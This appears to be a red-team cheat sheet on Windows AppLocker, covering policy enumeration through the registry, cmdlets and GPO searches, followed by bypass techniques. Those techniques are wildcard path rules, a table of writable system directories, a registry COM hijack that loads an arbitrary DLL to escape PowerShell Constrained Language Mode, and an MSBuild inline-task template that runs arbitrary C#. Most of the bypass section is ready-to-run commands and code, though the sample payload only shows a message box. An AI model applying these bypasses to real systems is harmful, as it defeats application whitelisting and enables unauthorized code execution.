
#### Enumeration

Local enumeration via registry key and subkeys (appx, exe, dll, msi, etc.)
```powershell
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'
```

Local enumeration via AppLocker cmdlet
```powershell
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections
```

GPO enumeration
```powershell
ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath
```

```powershell
ls [gPCFileSysPath]\Machine

download []\Machine\Registry.pol
```

```powershell
Parse-PolFile -Path .\Desktop\Registry.pol
```

---

#### Bypasses

###### Path Wildcards

An executable in any directory called _App-V_ will be allowed to run per this rule.

```xml
<FilePathRule Id="daecf627-c762-4c7d-849a-7eb9d4e9692e" Name="App-V" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
	<Conditions>
		<FilePathCondition Path="*\App-V\*"/>
	</Conditions>
</FilePathRule>
```

##### Writable Directories

| Directory                               |
| --------------------------------------- |
| C:\Windows\Tasks                        |
| C:\Windows\Temp                         |
| C:\Windows\tracing                      |
| C:\Windows\System32\spool\PRINTERS      |
| C:\Windows\System32\spool\SERVERS       |
| C:\Windows\System32\spool\drivers\color |

##### PowerShell CLM

 Creating custom COM object that will load an arbitrary DLL into the PowerShell process. 

```powershell
[System.Guid]::NewGuid()

New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '[GUID]'

New-Item -Path 'HKCU:Software\Classes\CLSID\[GUID]' -Name 'InprocServer32' -Value 'C:\Users\pchilds\Desktop\bypass.dll'

New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\[GUID]\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'

New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '[GUID]'
```

```powershell
New-Object -ComObject AppLocker.Bypass
```


##### LOLBAS  [MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)

Template for `.csproj` file to run arbitrary C#

```c#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Reference Include="System.Windows.Forms" />		
      <Code Type="Class" Language="cs">
        <![CDATA[
		using Microsoft.Build.Utilities;
		using System.Windows.Forms;

		public class MSBuild : Task
		{
			public override bool Execute()
			{
				MessageBox.Show("Hello World", "AppLocker Bypass");
				return true;
			}
		}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Execute
```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe test.csproj
```